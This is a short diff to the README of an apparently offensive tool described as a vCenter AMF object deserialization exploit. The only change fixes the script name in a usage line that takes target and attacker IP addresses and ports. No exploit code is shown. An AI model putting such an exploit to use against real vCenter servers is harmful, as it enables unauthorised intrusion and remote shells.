@@ -4,5 +4,5 @@ vcenter AMF object deserialization exploit
 
 ## Usage  
 ```bash
-python3 longtail targetip targetport  attackip attacker port
+python3 longtail.py targetip targetport  attackip attacker port
 ```
